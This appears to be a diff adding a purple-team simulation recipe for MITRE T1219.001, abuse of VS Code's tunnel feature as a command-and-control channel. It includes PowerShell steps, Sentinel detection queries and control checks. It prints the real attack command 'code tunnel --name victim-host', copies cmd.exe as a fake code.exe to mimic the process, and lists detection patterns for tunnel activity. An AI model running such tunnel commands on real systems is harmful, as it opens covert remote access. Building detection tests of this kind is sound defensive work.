@@ -1,0 +1,120 @@
+id: T1219.001_remote_access_ide_tunneling
+name: "Remote Access Tools — IDE Tunneling"
+mitre_technique: "T1219.001"
+mitre_tactic: "command_and_control"
+description: >
+  Adversaries abuse IDE remote development features — particularly Visual Studio Code's
+  built-in tunnel feature (code tunnel) — to establish a persistent, authenticated
+  C2 channel. The VSCode tunnel authenticates via GitHub/Microsoft account, creating
+  a reverse shell accessible through vscode.dev or github.dev web portals. Traffic
+  flows through Microsoft or GitHub infrastructure, making it appear completely
+  legitimate. The tunnel survives network changes and bypasses most egress controls
+  since it's outbound HTTPS to Microsoft endpoints.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1219/001/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1219.001 — IDE Tunneling C2 simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Check for VSCode tunnel binary and simulate tunnel invocation"
+    command: |
+      Write-Host "[PAS] VSCode tunnel C2 simulation:"
+
+      # Locate code.exe or code tunnel
+      $codePaths = @(
+          "$env:LOCALAPPDATA\Programs\Microsoft VS Code\bin\code.cmd",
+          "$env:LOCALAPPDATA\Programs\Microsoft VS Code\Code.exe",
+          (Get-Command code -ErrorAction SilentlyContinue)?.Source
+      )
+
+      $codeExe = $codePaths | Where-Object { $_ -and (Test-Path $_) } | Select-Object -First 1
+
+      if ($codeExe) {
+          Write-Host "[PAS] VSCode found: $codeExe"
+          Write-Host "[PAS] Real attack command: code tunnel --name victim-host --accept-server-license-terms"
+          Write-Host "[PAS] Creates tunnel accessible at: https://vscode.dev/tunnel/victim-host"
+          # Just generate the process event — do NOT actually create a tunnel
+          Write-Host "[PAS] (Tunnel not created — simulation only generates process telemetry)"
+      } else {
+          Write-Host "[PAS] VSCode not installed — simulating code.exe process event:"
+          # Create a dummy to generate the process telemetry pattern
+          $fakeCode = "$env:TEMP\PAS_T1219_001_code.exe"
+          Copy-Item "$env:SystemRoot\System32\cmd.exe" $fakeCode -Force
+          $proc = Start-Process $fakeCode `
+              -ArgumentList "tunnel --name PAS-victim-host --accept-server-license-terms" `
+              -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+          Start-Sleep -Milliseconds 500
+          if ($proc -and -not $proc.HasExited) {
+              $proc | Stop-Process -Force -ErrorAction SilentlyContinue
+          }
+          Write-Host "[PAS] code.exe tunnel process event generated"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Check for existing VSCode tunnel service or scheduled task"
+    command: |
+      Write-Host "[PAS] Checking for persistent VSCode tunnel artifacts:"
+
+      # VSCode tunnel can install itself as a service
+      $tunnelSvc = Get-Service "code-tunnel" -ErrorAction SilentlyContinue
+      if ($tunnelSvc) {
+          Write-Host "  SERVICE FOUND: code-tunnel (Status: $($tunnelSvc.Status))"
+          Write-Host "  ALERT: VSCode tunnel running as persistent service"
+      }
+
+      # Check scheduled tasks
+      $tunnelTask = Get-ScheduledTask -TaskName "*code*tunnel*" -ErrorAction SilentlyContinue
+      if ($tunnelTask) {
+          Write-Host "  TASK FOUND: $($tunnelTask.TaskName)"
+      }
+
+      # Check for tunnel process
+      $tunnelProc = Get-Process -Name "code-tunnel" -ErrorAction SilentlyContinue
+      if ($tunnelProc) {
+          Write-Host "  PROCESS FOUND: code-tunnel.exe (PID: $($tunnelProc.Id))"
+      }
+
+      Write-Host "[PAS] VSCode tunnel persistence check complete"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — code.exe or code-tunnel.exe with 'tunnel' argument, outbound HTTPS to vscode.dev/tunnel domains"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove simulation artifacts"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1219_001_code.exe" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] IDE tunnel simulation artifacts removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1219.001 cleanup complete"
+
+analyst_checklist:
+  - "Process event: Code.exe or code-tunnel.exe with 'tunnel' argument"
+  - "Network event: outbound HTTPS to *.vscode.dev, *.tunnel.dev, or *.github.dev from non-dev workstations"
+  - "Service event: 'code-tunnel' service installed or started"
+  - "Sentinel: DeviceProcessEvents | where FileName in ('Code.exe','code-tunnel.exe') and ProcessCommandLine contains 'tunnel'"
+  - "Sentinel: DeviceNetworkEvents | where RemoteUrl contains 'vscode.dev' or RemoteUrl contains 'tunnel.dev' and InitiatingProcessFileName != 'Code.exe'"
+  - "MDE alert: 'Developer tunneling tool used for remote access'"
+  - "CONTROL CHECK: Block *.vscode.dev and *.tunnel.dev at proxy for non-developer workstations"
+  - "CONTROL CHECK: AppLocker/WDAC — alert on code-tunnel.exe execution; this is rarely legitimate on non-dev systems"
+  - "CONTROL CHECK: Software inventory — flag VSCode installation on servers and non-developer endpoints"
